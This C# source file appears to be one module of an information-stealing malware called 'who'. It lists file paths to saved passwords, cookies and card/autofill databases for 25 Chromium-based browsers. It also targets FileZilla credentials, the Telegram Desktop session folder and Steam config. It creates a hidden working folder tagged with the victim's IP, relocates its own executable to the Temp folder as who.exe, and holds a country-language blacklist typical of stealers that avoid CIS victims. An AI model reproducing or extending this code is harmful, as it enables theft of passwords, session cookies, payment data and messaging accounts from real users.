namespace who
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Reflection;
    using who.Func;
    using who.Helper;

    public class Dirs
    {

        public static string Temp = Environment.GetEnvironmentVariable("Temp");
        public static string LocalAppData = Environment.GetEnvironmentVariable("LocalAppData");
        public static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public static string Documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        public static string UserName = Environment.UserName;
        public static string WorkDir = Temp + '\\' + User.IP + "_" + User.randomnm;

        public static string FileZilla = AppData + "\\FileZilla";
        public static string TelegramDesktop = AppData + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C";

        public static string Steam = (string)Microsoft.Win32.Registry.GetValue(@"HKEY_CURRENT_USER\SOFTWARE\Valve\Steam",
            "Steampath", null);
        public static string Config = Steam + "\\config";
        public static string SteamDir = WorkDir + "\\Steam";


        public static string LoginData = "Login Data";
        public static string[] BrowsPass = new string[25]
        {
            LocalAppData + "\\Google\\Chrome\\User Data\\Default\\" + LoginData,
            AppData + "\\Opera Software\\Opera Stable\\" + LoginData,
            LocalAppData + "\\Kometa\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Orbitum\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Comodo\\Dragon\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Amigo\\User\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Torch\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\CentBrowser\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Go!\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\uCozMedia\\Uran\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\MapleStudio\\ChromePlus\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\BlackHawk\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\AcWebBrowser\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\CoolNovo\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Epic Browser\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Baidu Spark\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Rockmelt\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Sleipnir\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\SRWare Iron\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Titan Browser\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Flock\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Vivaldi\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Sputnik\\User Data\\Default\\" + LoginData,
            LocalAppData + "\\Maxthon\\User Data\\Default\\" + LoginData
        };

        public static string cookies = "Cookies";
        public static string[] BrowsCookies = new string[25]
        {
            LocalAppData + "\\Google\\Chrome\\User Data\\Default\\" + cookies,
            AppData + "\\Opera Software\\Opera Stable\\" + cookies,
            LocalAppData + "\\Kometa\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Orbitum\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Comodo\\Dragon\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Amigo\\User\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Torch\\User Data\\Default\\" + cookies,
            LocalAppData + "\\CentBrowser\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Go!\\User Data\\Default\\" + cookies,
            LocalAppData + "\\uCozMedia\\Uran\\User Data\\Default\\" + cookies,
            LocalAppData + "\\MapleStudio\\ChromePlus\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\" + cookies,
            LocalAppData + "\\BlackHawk\\User Data\\Default\\" + cookies,
            LocalAppData + "\\AcWebBrowser\\User Data\\Default\\" + cookies,
            LocalAppData + "\\CoolNovo\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Epic Browser\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Baidu Spark\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Rockmelt\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Sleipnir\\User Data\\Default\\" + cookies,
            LocalAppData + "\\SRWare Iron\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Titan Browser\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Flock\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Vivaldi\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Sputnik\\User Data\\Default\\" + cookies,
            LocalAppData + "\\Maxthon\\User Data\\Default\\" + cookies
        };

        public static string WebData = "Web Data";
        public static string[] BrowsCC = new string[25]
        {
            LocalAppData + "\\Google\\Chrome\\User Data\\Default\\" + WebData,
            AppData + "\\Opera Software\\Opera Stable\\" + WebData,
            LocalAppData + "\\Kometa\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Orbitum\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Comodo\\Dragon\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Amigo\\User\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Torch\\User Data\\Default\\" + WebData,
            LocalAppData + "\\CentBrowser\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Go!\\User Data\\Default\\" + WebData,
            LocalAppData + "\\uCozMedia\\Uran\\User Data\\Default\\" + WebData,
            LocalAppData + "\\MapleStudio\\ChromePlus\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\" + WebData,
            LocalAppData + "\\BlackHawk\\User Data\\Default\\" + WebData,
            LocalAppData + "\\AcWebBrowser\\User Data\\Default\\" + WebData,
            LocalAppData + "\\CoolNovo\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Epic Browser\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Baidu Spark\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Rockmelt\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Sleipnir\\User Data\\Default\\" + WebData,
            LocalAppData + "\\SRWare Iron\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Titan Browser\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Flock\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Vivaldi\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Sputnik\\User Data\\Default\\" + WebData,
            LocalAppData + "\\Maxthon\\User Data\\Default\\" + WebData
        };

        public static string[] BrowsHistory = new string[]
            {
                LocalAppData + "\\Google\\Chrome\\User Data\\Default\\History"
            };

        public static string[] BlackList = new string[]
            {
                "ru", "uk", "be", "kz",
                "ka", "ky", "uz"
            };

        public static string[] BrowsersName = new string[]
            {
                "Google Chrome", "Mozilla Firefox",
                "Opera Browser",
            };

        public static void WorkDirCreate() //
        {
            Console.WriteLine("DIR " + WorkDir + " Created!");
            DirectoryInfo WD = Directory.CreateDirectory(WorkDir);
            WD.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
        }

        public static void Move()
        {
            if (File.Exists(Temp + "\\who.exe"))
            {
                try { File.Delete(Temp + "\\who.exe"); }
                catch { }
            }
            try
            {
                File.Move(Directory.GetCurrentDirectory() + "\\" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name,
                    Temp + "\\who.exe");
            }
            catch
            { }
        }
     
        public static List<string> LogPC = new List<string>();
    }
}
